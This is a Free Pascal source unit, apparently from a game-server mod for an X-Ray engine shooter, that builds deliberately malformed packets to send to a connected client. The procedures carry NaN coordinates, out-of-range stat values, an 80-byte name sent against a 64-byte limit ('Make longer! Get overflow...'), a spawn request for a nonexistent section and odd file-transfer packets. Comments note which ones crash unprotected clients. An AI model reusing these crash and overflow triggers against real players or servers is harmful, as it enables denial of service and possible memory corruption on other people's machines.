unit badpackets;
{$mode delphi}
interface
uses PureServer;

procedure SendBrokenMovePlayersPacket(srv:pIPureServer; cl_id:cardinal; gameid:word); stdcall;
procedure SendBrokenChangeNamePacket(srv:pIPureServer; cl_id:cardinal); stdcall;
procedure SendBrokenSpawnPacket(srv:pIPureServer; cl_id:cardinal); stdcall;
procedure SendBrokenUpdatePacket(srv:pIPureServer; cl_id:cardinal); stdcall; 
procedure SendBrokenSVConfigGamePacket(srv:pIPureServer; cl_id:cardinal); stdcall;

procedure SendFileReceiveStart(srv:pIPureServer; cl_id:cardinal); stdcall;
procedure SendFileReceivePacket(srv:pIPureServer; cl_id:cardinal); stdcall;

implementation
uses Packets, Servers;

procedure SendBrokenUpdatePacket(srv:pIPureServer; cl_id:cardinal); stdcall;  //100% Crash :)
var
  p:NET_Packet;
  b:byte;
  w:word;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_UPDATE, sizeof(M_UPDATE)); //хидер
  WriteToPacket(@p, @cl_id, sizeof(cl_id));
  b:=0;
  WriteToPacket(@p, @b, sizeof(b)); //bFullUpdate
  b:=5;
  WriteToPacket(@p, @b, sizeof(b)); //Team
  w:=$FFFF;
  WriteToPacket(@p, @w, sizeof(w)); //RivalKills
  WriteToPacket(@p, @w, sizeof(w)); //SelfKills
  WriteToPacket(@p, @w, sizeof(w)); //TeamKills
  WriteToPacket(@p, @w, sizeof(w)); //Deaths
  //ну и хватит ) Хотя можно и дальше было бы извращаться, но клиенту хватит и этого
  //захочешь больше - смотри game_PlayerState::net_Import

  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;

procedure SendBrokenSVConfigGamePacket(srv:pIPureServer; cl_id:cardinal); stdcall;
var
  p:NET_Packet;
  s:string;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_SV_CONFIG_NEW_CLIENT, sizeof(M_SV_CONFIG_NEW_CLIENT)); //хидер
  s:='unk';
  WriteToPacket(@p, PChar(s), length(s)+1); //хидер

  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;

procedure SendBrokenMovePlayersPacket(srv:pIPureServer; cl_id:cardinal; gameid:word); stdcall;
//server's crash can appears!!!
var
  p:NET_Packet;
  s:string;
  b:byte;
  c:cardinal;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_MOVE_PLAYERS, sizeof(M_MOVE_PLAYERS)); //хидер
  b:=1;
  WriteToPacket(@p, @b, sizeof(b)); //count
  WriteToPacket(@p, @gameid, sizeof(gameid));

  c:=$FFFFFFFF; //NAN
  WriteToPacket(@p, @c, sizeof(c));
  WriteToPacket(@p, @c, sizeof(c));
  WriteToPacket(@p, @c, sizeof(c));
  WriteToPacket(@p, @c, sizeof(c));
  WriteToPacket(@p, @c, sizeof(c));
  WriteToPacket(@p, @c, sizeof(c));          

  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;


procedure SendBrokenChangeNamePacket(srv:pIPureServer; cl_id:cardinal); stdcall;
//Crash w\o sace, all ok with SACE
var
  p:NET_Packet;
  s:string;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_CHANGE_SELF_NAME, sizeof(M_CHANGE_SELF_NAME)); //хидер
  //max 64 bytes. Make longer! Get overflow...
  s:='12345678901234567890123456789012345678901234567890123456789012345678901234567890';
  WriteToPacket(@p, PChar(s), length(s)+1);
  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;

procedure SendBrokenSpawnPacket(srv:pIPureServer; cl_id:cardinal); stdcall;
//100% Crash
var
  p:NET_Packet;
  s:string;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_SPAWN, sizeof(M_SPAWN)); //хидер
  s:='sace3_anticheat';  //this section is not exist ;)
  WriteToPacket(@p, PChar(s), length(s)+1);
  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;

procedure SendFileReceiveStart(srv:pIPureServer; cl_id:cardinal); stdcall;
var
  p:NET_Packet;
  b:byte;
  s:string;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_GAMEMESSAGE, sizeof(M_GAMEMESSAGE)); //хидер
  WriteToPacket(@p, @GAME_EVENT_MAKE_DATA, sizeof(GAME_EVENT_MAKE_DATA));
  b:=2;//   e_screenshot_response
  WriteToPacket(@p, @b, sizeof(b));

  WriteToPacket(@p, @cl_id, sizeof(cl_id));
  s:='\.\test';
{  s:='';
  for b:=0 to 33 do begin
  s:=s+'1234567890';
  end;}
  WriteToPacket(@p, PChar(s), length(s)+1);

  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;

procedure SendFileReceivePacket(srv:pIPureServer; cl_id:cardinal); stdcall;
var
  p:NET_Packet;
  b:byte;
  s:string;
  c:cardinal;
begin
  ClearPacket(@p);
  p.w_allow:=true;
  WriteToPacket(@p, @M_FILE_TRANSFER, sizeof(M_FILE_TRANSFER)); //хидер
  b:=0; //receive_data
  WriteToPacket(@p, @b, sizeof(b));

  WriteToPacket(@p, @cl_id, sizeof(cl_id));

  c:=1;
  WriteToPacket(@p, @c, sizeof(c));//m_data_size_to_receive
  c:=1;
  WriteToPacket(@p, @c, sizeof(c));//m_user_param

  WriteToPacket(@p, @b, sizeof(b));//data

  IPureServer__SendTo.Call([srv, cl_id, @p, 8, 0]);
end;



end.
